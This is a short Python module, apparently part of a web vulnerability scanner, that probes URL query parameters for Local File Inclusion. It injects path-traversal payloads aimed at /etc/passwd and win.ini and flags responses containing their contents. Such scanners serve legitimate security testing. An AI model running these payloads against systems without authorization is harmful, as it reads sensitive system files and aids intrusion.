import requests
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

LFI_INDICATORS = [
    "root:x:0:0:",
    "[extensions]" # common in win.ini
]

def run_lfi_scan(target_url, endpoints, forms):
    print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Running Local File Inclusion (LFI) Scan...")
    results = []

    # 1. Scan query parameters in endpoints
    for url in endpoints:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            continue
            
        for param_name in params:
            for payload in PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed_url._replace(query=new_query))
                
                try:
                    r = requests.get(test_url, timeout=5)
                    content = r.text
                    
                    for indicator in LFI_INDICATORS:
                        if indicator in content:
                            res = f"Possible LFI on {test_url} [Param: {param_name}]"
                            print(f"  [{Fore.RED}!{Style.RESET_ALL}] {res}")
                            results.append({"type": "lfi", "desc": res, "severity": "Critical"})
                            break
                except requests.RequestException:
                    continue

    # Note: Not scanning forms for LFI by default to prevent heavy noise, 
    # but could be added easily following the XSS/SQLi structure.

    return results
